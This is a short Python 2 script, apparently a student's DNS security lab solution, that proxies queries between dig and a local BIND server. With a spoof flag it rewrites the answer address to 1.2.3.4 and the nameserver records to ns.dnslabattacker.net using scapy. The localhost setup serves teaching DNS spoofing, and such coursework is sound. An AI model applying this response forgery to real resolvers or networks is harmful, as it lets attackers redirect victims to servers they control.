#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *


# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response


#python2 dnsproxy_starter.py --port <PROXY port number> --dns_port <NAMED port number>.
#python2 dnsproxy_starter.py --port 4704 --dns_port 4702
#python2 dnsproxy_starter.py --port 4704 --dns_port 4702 --spoof_response
print(port, dns_port)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("127.0.0.1", port))

while True:
    #receive data from dig and remember its addr
    data = sock.recvfrom(8192)
    #print("dig data:",data[0], "dig addr", data[1])
    dig_addr = data[1]

    #send received data to BIND server
    sock.sendto(data[0], ("127.0.0.1", dns_port))

    data = sock.recvfrom(8192)
    #print("BIND data:",data[0], "BIND addr", data[1])

    if SPOOF:
        # Parse the packet from the string
        packet = DNS(data[0])

        # Show the parsed packet
        print("Parsed packet:")
        print(packet.show())
        print("here")
        print("\n\n\n\n")
        print(packet[DNS].an.rdata)

        # Change Ip
        packet[DNS].an.rdata = "1.2.3.4"
        # change naming server
        packet[DNS].ns[0].rdata = "ns.dnslabattacker.net"
        packet[DNS].ns[1].rdata = "ns.dnslabattacker.net"

        #change packet to string and send
        sock.sendto(str(packet), dig_addr)
    else:
        #send to dig
        sock.sendto(data[0], dig_addr)

    
